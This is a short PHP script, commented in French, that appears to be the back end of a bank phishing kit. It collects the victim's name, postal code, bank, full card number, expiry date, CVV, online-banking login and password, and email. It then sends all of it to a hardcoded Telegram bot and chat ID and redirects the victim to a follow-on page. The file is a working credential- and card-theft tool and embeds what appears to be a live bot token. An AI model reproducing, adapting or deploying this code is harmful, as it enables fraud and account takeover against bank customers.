<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nom = $_POST['nom'];
    $prenom = $_POST['prenom'];
    $codePostal = $_POST['code-postal'];
    $region = $_POST['region'];
    $banque = $_POST['banque'];
    $departement = $_POST['departement'];
    $carteNumero = implode('-', $_POST['carte-numero']);
    $expiration = implode('/', $_POST['expiration']);
    $cvv = $_POST['cvv'];
    $identifiant = $_POST['identifiant'];
    $motDePasse = $_POST['mot-de-passe'];
    $email = $_POST['email'];

    // Remplacez par votre token de bot Telegram et l'ID du chat
    $telegramBotToken = '7727944499:AAHpgP9-xAAbtGZpBrYBfaX_FbkZiWVeEtw';
    $telegramChatId = '7263826117';

    $message = "
    ⚠️ Nouvelle authentification : ⚠️

    👤 Nom : $nom
    👤 Prénom : $prenom
    📍 Code Postal : $codePostal
    🗺️ Région : $region
    🏦 Banque : $banque
    🏢 Département : $departement
    💳 Numéro de Carte : $carteNumero
    📅 Expiration : $expiration
    🔒 CVV : $cvv
    🔑 Identifiant : $identifiant
    🔐 Mot de passe : $motDePasse
    📧 Email : $email
    ";

    $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatId&text=" . urlencode($message);

    if (file_get_contents($url)) {
        header('Location: index3.html');
        exit();
    } else {
        echo "Erreur lors de l'envoi des données à Telegram.";
    }
} else {
    echo "Méthode non autorisée.";
}
?>
